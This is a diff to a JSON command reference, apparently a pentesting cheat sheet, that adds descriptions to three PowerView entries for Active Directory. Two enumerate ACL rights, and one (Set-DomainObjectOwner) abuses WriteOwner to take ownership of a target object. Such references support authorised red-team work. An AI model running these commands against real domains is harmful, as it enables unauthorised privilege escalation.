@@ -220,15 +220,18 @@
   "variations": [
     {
       "label": "Filter to interesting rights",
-      "command": "Get-DomainObjectAcl -Identity <object> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite'}"
+      "command": "Get-DomainObjectAcl -Identity <object> -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|GenericWrite'}",
+      "description": "Uses PowerView to enumerate ACLs on AD objects with GUID-to-name resolution. Reveals who has write, reset-password, or other dangerous permissions on target objects - the foundation of ACL-based attack paths."
     },
     {
       "label": "Who has rights over Domain Admins",
-      "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose"
+      "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose",
+      "description": "Uses PowerView to enumerate ACLs on AD objects with GUID-to-name resolution. Reveals who has write, reset-password, or other dangerous permissions on target objects - the foundation of ACL-based attack paths."
     },
     {
       "label": "Set-DomainObjectOwner - WriteOwner abuse (take ownership, then WriteDACL)",
-      "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred"
+      "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred",
+      "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
     }
   ],
   "steps": [
